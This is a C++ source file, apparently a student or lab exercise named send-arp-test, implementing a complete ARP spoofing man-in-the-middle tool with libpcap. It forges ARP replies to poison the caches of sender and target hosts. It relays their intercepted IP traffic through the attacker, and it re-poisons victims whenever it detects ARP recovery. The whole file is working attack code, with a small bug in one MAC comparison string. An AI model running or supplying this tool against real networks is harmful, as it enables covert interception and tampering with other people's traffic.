#include <cstdio>
#include <pcap.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <string.h>
#include <vector>
#include "ethhdr.h"
#include "arphdr.h"
#include "iphdr.h"

#define JUMBO_FRAME_SIZE 9000
using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

Ip get_my_ip(const char* dev) {
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);

    ioctl(fd, SIOCGIFADDR, &ifr);
    close(fd);

    struct sockaddr_in* addr = (struct sockaddr_in*)&ifr.ifr_addr;
    char ip_str[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &addr->sin_addr, ip_str, sizeof(ip_str));

    return Ip(ip_str);
}

Mac get_my_mac(const char* dev) {
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);

    strcpy(ifr.ifr_name, dev);
    ioctl(fd, SIOCGIFHWADDR, &ifr);

    close(fd);
    return Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);
}

Mac get_sender_mac(pcap_t* pcap, Mac my_mac, Ip my_ip, Ip sender_ip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
    packet.eth_.smac_ = my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = my_mac;
    packet.arp_.sip_ = htonl(my_ip);
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(sender_ip);

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
        return Mac("00:00:00:00:00:00");
    }

    struct pcap_pkthdr* header;
    const u_char* packet_data;
    while (true) {
        int res = pcap_next_ex(pcap, &header, &packet_data);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        EthArpPacket* reply_packet = (EthArpPacket*)packet_data;
        if (ntohs(reply_packet->eth_.type_) != EthHdr::Arp) continue;
        if (ntohs(reply_packet->arp_.op_) != ArpHdr::Reply) continue;
        if (reply_packet->arp_.sip_ != htonl(sender_ip)) continue;

        return reply_packet->arp_.smac_;
    }
    return Mac("00:00:00:00:00:00");
}

void send_arp_spoof(pcap_t* pcap, Mac attacker_mac, Mac sender_mac, Ip sender_ip, Ip target_ip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = sender_mac;
    packet.eth_.smac_ = attacker_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = attacker_mac;
    packet.arp_.sip_ = htonl(target_ip);
    packet.arp_.tmac_ = sender_mac;
    packet.arp_.tip_ = htonl(sender_ip);

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
    }
}

void relay_packet(pcap_t* pcap, const u_char* packet_data, int packet_len, Mac attacker_mac, Mac target_mac) {
    struct EthHdr* eth_header = (struct EthHdr*)packet_data;

    eth_header->dmac_ = target_mac;
    eth_header->smac_ = attacker_mac;

    int res = pcap_sendpacket(pcap, packet_data, packet_len);
    if (res != 0) {
        fprintf(stderr, "Failed to replay packet: %s\n", pcap_geterr(pcap));
    }
}

bool check_arp_recovery(const u_char* packet_data, Ip target_ip, Ip sender_ip, Mac sender_mac) {
    EthArpPacket* arp_packet = (EthArpPacket*)packet_data;

    if (ntohs(arp_packet->eth_.type_) != EthHdr::Arp) {
        return false;
    }

    Ip sip = ntohl(arp_packet->arp_.sip_);
    Ip tip = ntohl(arp_packet->arp_.tip_);
    Mac smac = arp_packet->arp_.smac_;

    if (ntohs(arp_packet->arp_.op_) == ArpHdr::Request && sip == sender_ip && tip == target_ip) {
        printf("Recovery detected: Sender requesting target's real MAC\n");
        return true;
    }

    if (ntohs(arp_packet->arp_.op_) == ArpHdr::Reply && sip == target_ip && tip == sender_ip) {
        printf("Recovery detected: Target sending real MAC to sender\n");
        return true;
    }

    if (ntohs(arp_packet->arp_.op_) == ArpHdr::Request && sip == sender_ip && sender_mac == smac) {
        printf("Sender is broadcasting ARP request\n");
        return true;
    }

    return false;
}

void process_packets(pcap_t* pcap, Mac attacker_mac, vector<pair<Mac, Mac>>& mac_pairs, vector<pair<Ip, Ip>>& ip_pairs) {
    struct pcap_pkthdr* header;
    const u_char* packet_data;
    u_char* buffer = new u_char[JUMBO_FRAME_SIZE];

    while(true) {
        int res = pcap_next_ex(pcap, &header, &packet_data);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        memcpy(buffer, packet_data, header->len);

        EthArpPacket* arp_packet = (EthArpPacket*)buffer;
        if (ntohs(arp_packet->eth_.type_) == EthHdr::Arp) {
            for (size_t i = 0; i < ip_pairs.size(); i++) {
                if (check_arp_recovery(buffer, ip_pairs[i].second, ip_pairs[i].first, mac_pairs[i].first)) {
                    printf("Reinfecting after recovery detection...\n");
                    usleep(500000);

                    for(int j = 0; j < 5; j++) {
                        send_arp_spoof(pcap, attacker_mac, mac_pairs[i].first, ip_pairs[i].first, ip_pairs[i].second);

                        send_arp_spoof(pcap, attacker_mac, mac_pairs[i].second, ip_pairs[i].second, ip_pairs[i].first);
                        usleep(100000);
                    }
                }
            }
        }

        struct EthHdr* eth_header = (struct EthHdr*)buffer;
        if (ntohs(eth_header->type_) == EthHdr::Ip4) {
            struct IpHdr* ip_header = (struct IpHdr*)(buffer + sizeof(EthHdr));
            Ip src_ip = ntohl(ip_header->sip_);
            Ip dst_ip = ntohl(ip_header->dip_);

            for (size_t i = 0; i < ip_pairs.size(); i++) {
                if (src_ip == ip_pairs[i].first) {
                    relay_packet(pcap, buffer, header->len, attacker_mac, mac_pairs[i].second);
                    break;
                }
                else if (src_ip == ip_pairs[i].second && dst_ip == ip_pairs[i].first) {
                    relay_packet(pcap, buffer, header->len, attacker_mac, mac_pairs[i].first);
                    break;
                }
            }
        }
    }
    delete[] buffer;
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
		usage();
        return EXIT_FAILURE;
    }

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, JUMBO_FRAME_SIZE, 1, 1, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return EXIT_FAILURE;
	}

    Ip attacker_ip = get_my_ip(dev);
    Mac attacker_mac = get_my_mac(dev);
    printf("Attacker IP Address :%s\n", std::string(attacker_ip).c_str());
    printf("Attacker MAC Address : %s\n", std::string(attacker_mac).c_str());

    vector<pair<Mac, Mac>> mac_pairs;
    vector<pair<Ip, Ip>> ip_pairs;

    for (int i = 2; i < argc; i += 2) {
        Ip sender_ip = Ip(argv[i]);
        Ip target_ip = Ip(argv[i + 1]);

        Mac sender_mac = get_sender_mac(pcap, attacker_mac, attacker_ip, sender_ip);
        if (sender_mac == Mac("00:00:00:00:00:00")) {
            fprintf(stderr, "Couldn't get sender MAC address\n");
            continue;
        }
        printf("-------Sender--------");
        printf("Sender IP Address :%s\n", std::string(sender_ip).c_str());
        printf("Sender MAC Address : %s\n", std::string(sender_mac).c_str());

        Mac target_mac = get_sender_mac(pcap, attacker_mac, attacker_ip, target_ip);
        if (target_mac == Mac("00:00:00:00:00:00:")) {
            fprintf(stderr, "Couldn't get target MAC address\n");
            continue;
        }
        printf("-------Target--------");
        printf("Target IP Address :%s\n", std::string(target_ip).c_str());
        printf("Target MAC Address : %s\n", std::string(target_mac).c_str());

        mac_pairs.push_back({sender_mac, target_mac});
        ip_pairs.push_back({sender_ip, target_ip});

        send_arp_spoof(pcap, attacker_mac, sender_mac, sender_ip, target_ip);
    }

    process_packets(pcap, attacker_mac, mac_pairs, ip_pairs);

	pcap_close(pcap);
}
